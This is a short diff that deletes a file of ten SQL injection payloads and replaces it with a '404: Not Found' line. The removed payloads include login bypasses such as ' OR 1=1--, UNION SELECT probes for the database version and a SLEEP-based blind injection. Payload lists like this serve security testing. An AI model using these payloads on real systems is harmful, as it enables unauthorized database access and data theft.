@@ -1,10 +1,1 @@
-' OR 1=1--
-' OR '1'='1
-admin' --
-admin' #
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT @@version,NULL,NULL--
-' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
-' OR 1=1 LIMIT 1--
-") OR 1=1--
-' OR 1=1#
+404: Not Found
